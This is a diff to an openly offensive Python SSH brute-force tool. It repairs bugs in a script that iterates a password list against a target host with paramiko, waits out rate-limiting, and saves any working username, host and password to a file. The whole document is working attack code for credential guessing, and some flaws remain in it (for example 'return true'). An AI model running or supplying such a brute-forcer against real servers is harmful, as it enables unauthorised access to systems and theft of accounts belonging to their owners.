@@ -11,8 +11,8 @@ GREEN = Fore.GREEN
 RESET = Fore. RESET
 RED = Fore.RED
 
-def is_ssh_open(hostname ,username ,passowrd):
-	client.paramiko.SSHClient()
+def is_ssh_open(hostname ,username ,password):
+	client = paramiko.SSHClient()
 	client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
 
 
@@ -26,7 +26,7 @@ def is_ssh_open(hostname ,username ,passowrd):
 	except paramiko.AuthenticationException:
 		print(f"Invalid credentials for {username}:{password}")
 
-	exceptparamiko.SSHException:
+	except paramiko.SSHException:
 		print(f"{BLUE}[*] Retrying after delay... {RESET}")
 		time.sleep(60)
 		return is_ssh_open(hostname ,username ,password)
@@ -35,7 +35,8 @@ def is_ssh_open(hostname ,username ,passowrd):
 		print(f"{GREEN} Found combo :\n\tHOSTNAME:{hostname}\n\tUSERNAME:{username}\n\tPASSWORD:{password}")
 
 	return true
-if __name__ = '__main__':
+
+if __name__ == '__main__':
 	parser = argparse.ArgumentParser(description= 'SSH Brute Force.')
 	parser.add_argument('host',help='Hostname or IP of the SSH server')
 	parser.add_argument('-P', '--passlist' ,help="password file for brute force")
@@ -52,4 +53,4 @@ if __name__ = '__main__':
 	for password in passlist:
 		if is_ssh_open(host , user , password):
 			open ("Credentials.txt", 'w').write(f'{user}@{host}:{password}')
-		break
+			break
